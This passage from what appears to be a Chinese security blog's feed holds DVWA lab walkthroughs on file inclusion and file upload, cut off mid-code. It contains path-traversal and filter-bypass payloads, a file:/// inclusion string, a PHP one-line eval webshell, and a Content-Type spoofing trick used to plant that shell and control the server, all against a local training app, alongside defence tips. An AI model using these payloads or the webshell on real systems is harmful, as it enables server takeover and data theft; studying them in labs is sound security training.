href="https://www.sqlsec.com/2020/05/dvwa.html#toc-heading-48">https://www.sqlsec.com/2020/05/dvwa.html#toc-heading-48</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
          <category> dvwa </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
            <tag> dvwa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含（File Include）</title>
      <link href="/2022/01/20/CTF/Web/dvwa/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88File-Include%EF%BC%89/"/>
      <url>/2022/01/20/CTF/Web/dvwa/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88File-Include%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含（File-Include）"><a href="#文件包含（File-Include）" class="headerlink" title="文件包含（File Include）"></a>文件包含（File Include）</h1><p><strong>前言：在学习文件上传时，制作的图片马需要我们手动去解析，而解析的方法就算用到了文件包含漏洞，所以这次就来学习一下文件包含漏洞。</strong></p><h1 id="文件包含漏洞简介"><a href="#文件包含漏洞简介" class="headerlink" title="文件包含漏洞简介"></a><strong>文件包含漏洞简介</strong></h1><blockquote><p>（一）文件包含可以分为<strong>本地文件包含</strong>和<strong>远程文件包含</strong>两种。文件包含和文件上传一样本身并不是漏洞，而是攻击者利用了包含的特性加上了应用本身对文件控制不严格，对include进来的文件不可控，才导致了一系列危害。<br>（二）本地文件包含就是通过URL将服务器本地的其他文件include进来。远程文件包含就是将远程服务器的文件include进来。<br>（三）最主要的是，包含进来的文件都以当前脚本文件解析，例如，当前测试系统是Apache加php环境，那么被include进来的文件，不管是什么类型，例如图片，文本文档等，这些文件被包含以后，都会被当做<strong>php脚本</strong>来解析。</p></blockquote><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a><strong>本地文件包含</strong></h2><blockquote><p>通过浏览器包含web服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格 的过滤允许遍历目录的字符注入浏览器并执行。<br>总的来说就是被包含的文件在服务器本地</p></blockquote><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a><strong>远程文件包含</strong></h2><blockquote><p>在远程服务器上预先设置好的脚本，然后攻击者利用该漏洞包含一个远程的文件，这种漏洞的出现是因为浏览器对用户的输入没有进行检查，导致不同程度的信息泄露、拒绝服务攻击 甚至在目标服务器上执行代码<br>简单的说就是被包含的文件在第三方服务器</p></blockquote><h2 id="文件包含常用函数"><a href="#文件包含常用函数" class="headerlink" title="文件包含常用函数"></a><strong>文件包含常用函数</strong></h2><p>以<strong>php</strong>为例，常用的文件包含函数有：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Include</span>()</span><br><span class="line"><span class="comment">#当包含并运行指定文件时，包含的外部文件发生错误，系统会给出警告，但整个php文件还会继续执行。</span></span><br><span class="line"><span class="keyword">Require</span>()</span><br><span class="line"><span class="comment">/*require()与 include()的区别在于 require()执行如果发生错误，函数会输出</span></span><br><span class="line"><span class="comment">错误信息，并终止脚本的运行。*/</span></span><br><span class="line"><span class="keyword">include_once</span>()</span><br><span class="line"><span class="comment">/*和include没有什么区别，只是在导入函数之前先检测下该文件是否被include过，如果已经执行了一遍，那么就不在进行第二次的include操作。*/</span></span><br><span class="line"><span class="keyword">require_once</span>()</span><br><span class="line"><span class="comment">#功能与 require()相同，区别在于当重复调用同一文件时，程序只调用一次</span></span><br></pre></td></tr></table></figure><h1 id="DVWA-文件包含"><a href="#DVWA-文件包含" class="headerlink" title="DVWA-文件包含"></a>DVWA-文件包含</h1><p>了解了一些文件包含漏洞的简介和常用函数，下面就通过<strong>万能的DVWA</strong>来进行文件包含漏洞的练习。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">注意:</span><br><span class="line">使用远程包含需要开启allow_url_include</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120161521396.png" alt="image-20220120161521396"></p><p>在此之前，先来了解一下<code>./和../以及/</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ 根目录</span><br><span class="line">./是当前目录</span><br><span class="line">../  返回到上一级目录</span><br><span class="line">../../ 返回了两级目录</span><br><span class="line">.\ 、..\和./、../意义相同</span><br></pre></td></tr></table></figure><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>设置难度为low</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120161914055.png" alt="image-20220120161914055"></p><h3 id="观察源码"><a href="#观察源码" class="headerlink" title="观察源码"></a>观察源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>观察源码发现直接是get方法进去，没有任何过滤，那么就来执行文件包含漏洞</p><h3 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><p>输入</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?page=../../phpinfo.php</span><br></pre></td></tr></table></figure><p>发现</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120163523373.png" alt="image-20220120163523373"></p><p>本地文件包含成功</p><h3 id="远程文件包含-1"><a href="#远程文件包含-1" class="headerlink" title="远程文件包含"></a><strong>远程文件包含</strong></h3><p>这里就先在自己的服务器根目录（WWW目录下）下创建一个文件</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120163832023.png" alt="image-20220120163832023"></p><p>然后通过远程文件包含来执行</p><h3 id="漏洞测试-1"><a href="#漏洞测试-1" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><p>输入</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?page=http:<span class="comment">//127.0.0.1/file.txt</span></span><br></pre></td></tr></table></figure><p>发现远程包含成功</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120164554462.png" alt="image-20220120164554462"></p><p>这里也可以用虚拟机和主机来进行远程文件包含漏洞的测试，不过这里就以本地的服务器来进行测试。</p><h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><p>调整难度为medium</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120164742273.png" alt="image-20220120164742273"></p><h3 id="观察源码-1"><a href="#观察源码-1" class="headerlink" title="观察源码"></a>观察源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="variable">$file</span> = str_replace( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"><span class="variable">$file</span> = str_replace( <span class="keyword">array</span>( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\\&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）</span><br></pre></td></tr></table></figure><p>发现medium已经过滤了<code>http://</code>、<code>../</code>等，那么就来构造这样的方法来进行绕过</p><h3 id="漏洞测试-2"><a href="#漏洞测试-2" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?page=..././..././phpinfo.php</span><br></pre></td></tr></table></figure><p>源码中过滤了<code>../</code>，所以我们输入的经过过滤后变成</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?page=../../phpinfo.php</span><br></pre></td></tr></table></figure><p>这样依旧是没有过滤掉<code>../</code>，通过错位进行拼接成<code>../</code></p><p>其实感觉绕过方法大多都是互通的，这种绕过在SQL注入、XSS攻击等都是出现过的</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120165247075.png" alt="image-20220120165247075"></p><p>本地文件包含成功，接下来来尝试远程文件包含</p><h3 id="远程文件包含-2"><a href="#远程文件包含-2" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>源码中是过滤了<code>http://</code>、<code>https://</code>,可以尝试大小写进行绕过，也可以通过双写进行绕过例如：<code>httphttp://://</code></p><h3 id="漏洞测试-3"><a href="#漏洞测试-3" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?page=Http://127.0.0.1/file.txt</span><br></pre></td></tr></table></figure><p>即可绕过</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120165406679.png" alt="image-20220120165406679"></p><h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p>调整难度为high</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120165455291.png" alt="image-20220120165455291"></p><h3 id="观察源码-2"><a href="#观察源码-2" class="headerlink" title="观察源码"></a>观察源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">&quot;file*&quot;</span>, <span class="variable">$file</span> ) &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fnmatch() 函数根据指定的模式来匹配文件名或字符串。</span><br></pre></td></tr></table></figure><p>源码中限制了文件名来防止恶意文件包含，并且<code>!fnmatch( &quot;file*&quot;, $file )</code>代码使用了<code>fnmatch</code>函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。所以就用到了file协议，就来了解一下file协议。</p><p><strong>file协议</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地文件传输协议 ,file协议主要用于访问本地计算机中的文件.</span><br></pre></td></tr></table></figure><p><strong>file协议的基本格式</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file:<span class="comment">///文件路径</span></span><br><span class="line">如打开D盘www文件下的PHPinfo文件</span><br><span class="line">file:<span class="comment">///D:/www/phpinfo</span></span><br><span class="line">注意:后面必须是绝对路径：</span><br></pre></td></tr></table></figure><p>了解了file协议，就构造相应的语句即可进行文件包含</p><h3 id="漏洞测试-4"><a href="#漏洞测试-4" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?page=file:<span class="comment">///D:\phpStudy\PHPTutorial\WWW\file.txt</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120171221751.png" alt="image-20220120171221751"></p><h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><p>调整难度为impossible</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120170137675.png" alt="image-20220120170137675"></p><h3 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only allow include.php or file&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file1.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file2.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file3.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>分析一下源码</p><p>发现<code>if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; )</code>这一句代码已经将page的参数限制成固定的值了，所以没有办法进行文件包含。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="文件包含漏洞原理"><a href="#文件包含漏洞原理" class="headerlink" title="文件包含漏洞原理"></a>文件包含漏洞原理</h2><p>文件包含漏洞是代码注入的一种。</p><p>其原理就是注入一段用户能控制的脚本或代码，并让服务器端执行，代码注入的典型代表就是文件包含File  inclusion。</p><p>文件包含可能会出现在jsp、php、asp等语言中。<strong>服务器通过函数去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到邪恶的目的</strong>。常见的文件包含的函数如下：</p><p><strong>PHP</strong>：include() 、include_once( )、require( )、require_once( )、fopen( )、readfile( )</p><p><strong>JSP/Servlet</strong>：ava.io.file( )、java.io.filereader( )</p><p><strong>ASP</strong>：include file、include virtual</p><h2 id="文件包含漏洞的分类"><a href="#文件包含漏洞的分类" class="headerlink" title="文件包含漏洞的分类"></a>文件包含漏洞的分类</h2><p>文件包含可以分为<strong>本地文件包含</strong>和<strong>远程文件</strong>包含两种。</p><p>顾名思义，本地文件包含就是<strong>通过URL将服务器本地的其他文件include进来</strong>。远程文件包含就是<strong>将远程服务器的文件include进来</strong>。最主要的是，包含进来的文件都以当前脚本文件解析，比如，当前测试系统是Apache加php环境，那么被include进来的文件，不管是什么类型，比如说图片，文本文档，这些文件被包含以后，都会被当做php脚本来解析。</p><h2 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h2><p>①<strong>严格判断包含中的参数是否外部可控</strong>，因为文件包含漏洞利用成功与否的关键点就在于被包含的文件是否可被外部控制；</p><p>②<strong>路径限制</strong>：限制被包含的文件只能在某一文件内，一定要禁止目录跳转字符，如：“../”；</p><p>③<strong>包含文件验证</strong>：验证被包含的文件是否是白名单中的一员；</p><p>④<strong>尽量不要使用动态包含</strong>，可以在需要包含的页面固定写好，如：include(‘head.php’)。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
          <category> dvwa </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dvwa </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传（File  Upload）</title>
      <link href="/2022/01/20/CTF/Web/dvwa/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88File%20%20Upload%EF%BC%89/"/>
      <url>/2022/01/20/CTF/Web/dvwa/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88File%20%20Upload%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传（File-Upload）"><a href="#文件上传（File-Upload）" class="headerlink" title="文件上传（File  Upload）"></a>文件上传（File  Upload）</h1><h2 id="文件上传介绍"><a href="#文件上传介绍" class="headerlink" title="文件上传介绍"></a>文件上传介绍</h2><p>File  Upload，即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。</p><p>上传的文件对 web 应用程序来说是一个巨大的风险，许多攻击的第一步是上传攻击代码到被攻击的系统上，然后攻击者只需要找到方法来执行代码即可完成攻击。也就是是说，文件上传是攻击者需要完成的第一步。</p><p>不受限制的文件上载的后果可能不同，包括完全接管系统、文件系统过载、将攻击转发到后端系统以及简单的破坏。这取决于应用程序对上载的文件做了什么，和文件的存储位置。</p><p>利用文件上传漏洞，在目标系统（例如 phpinfo() 或 system()）上执行您选择的任何 PHP 函数。</p><h2 id="文件上传危害"><a href="#文件上传危害" class="headerlink" title="文件上传危害"></a><strong>文件上传危害</strong></h2><blockquote><p>1.如果上传的文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行。</p><p>2.如果上传的文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。</p><p>3.甚至攻击者可以直接上传一个webshell到服务器上 完全控制系统或致使系统瘫痪。</p></blockquote><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120101500591.png" alt="image-20220120101500591"></p><h1 id="DVWA-文件上传（File-Upload）"><a href="#DVWA-文件上传（File-Upload）" class="headerlink" title="DVWA-文件上传（File Upload）"></a>DVWA-文件上传（File Upload）</h1><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>将难度设置为low</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120104351682.png" alt="image-20220120104351682"></p><p>Low level 不会以任何方式检查正在上载的文件的内容，它信任虽有上传的文件。</p><h3 id="观察源码"><a href="#观察源码" class="headerlink" title="观察源码"></a>观察源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">    <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// No</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Yes!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h3 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><p>由于没有任何的过滤，因此我们可以直接上传一个一句话木马。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mikasu&#x27;</span>]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接上传，网页没有进行过滤，直接返回了上传成功的信息。</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120105007887.png" alt="image-20220120105007887"></p><p><strong>访问上传成功的文件地址，查看文件是否上传成功以及成功被解析</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/dvwa/vulnerabilities/upload/../../hackable/uploads/mikasu.php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120110124722.png" alt="image-20220120110124722"></p><p>访问成功，没有报错，说明成功上传并且解析为php文件</p><p>打开菜刀，添加shell连接目标。</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120110432226.png" alt="image-20220120110432226"></p><p>此时可以随意访问服务器上的任意文件，进行任意操作。</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120110815120.png" alt="image-20220120110815120"></p><h2 id="midium"><a href="#midium" class="headerlink" title="midium"></a>midium</h2><p>调整难度为medium</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120111220150.png" alt="image-20220120111220150"></p><p>在中等级的页面下，将在上传时检查客户端报告的文件类型。</p><h3 id="观察源码-1"><a href="#观察源码-1" class="headerlink" title="观察源码"></a>观察源码</h3><p>源码如下，FILES 是一个已经弃用的 HTTP 文件上传变量，它是一个通过 HTTP POST  方式上传到当前脚本的项目的数组。由此可见源码会获取文件的文件名、文件类型和文件大小，它要求文件类型必须是 jpeg 或者  png，同时限制文件大小不能超过 100000B（约为97.6KB）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/jpeg&quot;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>此时我们再直接传输上面的一句话木马，会发现上传失败。</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120111735233.png" alt="image-20220120111735233"></p><h3 id="漏洞测试-1"><a href="#漏洞测试-1" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><p>我们还是先做个一句话木马，然后用 brup 抓包，看一下数据包的情况。看到上传的 PHP 文件类型会被显示在包中。</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120113247885.png" alt="image-20220120113247885"></p><p>修改文件类型为 “image/png”，然后放包。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: image/png</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120113328918.png" alt="image-20220120113328918"></p><p>点击forward</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120113349975.png" alt="image-20220120113349975"></p><p>回浏览器看会发现上传成功</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120113423610.png" alt="image-20220120113423610"></p><p>访问解析也没有问题</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120113453374.png" alt="image-20220120113453374"></p><p>菜刀连接也没问题</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120113527283.png" alt="image-20220120113527283"></p><p>可以看到虽然我们传的还是一句话木马，但是通过修改 http 报文可以通过网页的白名单检测，再次菜刀连接即可。</p><h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p>调整难度为high</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220120113641122.png" alt="image-20220120113641122"></p><p>当服务器从客户端接收到文件，它将尝试调整请求中包含的任何图像的大小。</p><h3 id="观察源码-2"><a href="#观察源码-2" class="headerlink" title="观察源码"></a>观察源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = substr( <span class="variable">$uploaded_name</span>, strrpos( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpg&quot;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpeg&quot;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$uploaded_tmp</span>, <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully 